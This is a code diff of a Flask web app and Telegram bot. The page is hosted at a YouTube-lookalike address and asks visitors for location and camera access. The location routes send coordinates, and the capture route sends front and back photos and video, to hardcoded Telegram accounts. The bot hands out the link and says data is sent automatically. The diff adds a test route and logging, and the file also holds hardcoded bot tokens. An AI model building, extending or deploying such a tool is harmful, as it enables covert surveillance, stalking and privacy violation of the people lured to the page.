@@ -4,13 +4,24 @@ from flask import Flask, request, render_template_string
 import telebot
 
 # ========== HARDCODED CONFIG ==========
-BOT_TOKEN = "8637899791:AAEjufAN7VOU6T4KEVcrBF4NncDJBh_di8w"
-USER_IDS = [7361880623, 8475691696]   # both accounts
+BOT_TOKEN = "8637899791:AAEcpjrVy2j9sUTK-rvpX_HsuKBpkX7gnlU"   # verify this is correct
+USER_IDS = [7361880623, 8475691696]                             # verify these are correct
 BASE_URL = "https://web-youtube-asuma66.up.railway.app"
 # ======================================
 
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
+
+# ---------- TEST ROUTE ----------
+@app.route('/test_bot')
+def test_bot():
+    """Manually send a test message to all users."""
+    try:
+        for uid in USER_IDS:
+            bot.send_message(uid, "✅ Bot is working! This is a test message.")
+        return "Test messages sent.", 200
+    except Exception as e:
+        return f"Error: {e}", 500
 
 # ---------- HTML PAGE (same as before) ----------
 HTML_PAGE = """<!DOCTYPE html>
@@ -215,8 +226,9 @@ def location():
         for uid in USER_IDS:
             try:
                 bot.send_message(uid, "📍 Location: Denied by user.")
+                print(f"Sent location denied to {uid}")
             except Exception as e:
-                print(f"Send error to {uid}: {e}")
+                print(f"Error sending to {uid}: {e}")
         return "OK", 200
     lat = data.get('lat')
     lng = data.get('lng')
@@ -225,8 +237,9 @@ def location():
             try:
                 bot.send_location(uid, lat, lng)
                 bot.send_message(uid, f"📍 Location: {lat}, {lng}")
+                print(f"Sent location {lat},{lng} to {uid}")
             except Exception as e:
-                print(f"Location send error to {uid}: {e}")
+                print(f"Error sending location to {uid}: {e}")
         return "OK", 200
     return "Invalid", 400
 
@@ -235,8 +248,9 @@ def camera_denied():
     for uid in USER_IDS:
         try:
             bot.send_message(uid, "📷 Camera: Denied by user.")
+            print(f"Sent camera denied to {uid}")
         except Exception as e:
-            print(f"Send error to {uid}: {e}")
+            print(f"Error sending camera denied to {uid}: {e}")
     return "OK", 200
 
 @app.route('/capture', methods=['POST'])
@@ -249,15 +263,18 @@ def capture():
             if front:
                 front.seek(0)
                 bot.send_photo(uid, front.read())
+                print(f"Sent front photo to {uid}")
             if back:
                 back.seek(0)
                 bot.send_photo(uid, back.read())
+                print(f"Sent back photo to {uid}")
             if video:
                 video.seek(0)
                 bot.send_video(uid, video.read(), supports_streaming=True)
+                print(f"Sent video to {uid}")
             bot.send_message(uid, "📸 Media capture complete.")
         except Exception as e:
-            print(f"Media send error to {uid}: {e}")
+            print(f"Error sending media to {uid}: {e}")
     return "OK", 200
 
 # ---------- BOT ----------
@@ -266,6 +283,7 @@ def send_link(m):
     bot.reply_to(m, f"🔗 Open this link on your phone:\n{BASE_URL}/\n\nIt will ask for location and camera, then send data automatically.")
 
 def run_bot():
+    print("Bot polling started.")
     bot.polling(non_stop=True, interval=1)
 
 if __name__ == '__main__':
